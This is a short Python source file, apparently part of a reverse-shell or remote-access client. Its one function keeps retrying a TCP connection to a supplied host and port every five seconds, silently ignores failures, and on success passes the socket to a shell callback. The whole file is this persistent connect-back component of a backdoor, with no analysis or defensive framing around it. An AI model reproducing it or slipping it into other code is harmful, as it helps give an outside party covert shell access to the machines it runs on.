import socket
import time

from client.core.protocol import reliable_send, reliable_recv


def connect_and_run(host, port, shell_callback):
    while True:
        time.sleep(5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            shell_callback(sock)
            sock.close()
            break
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
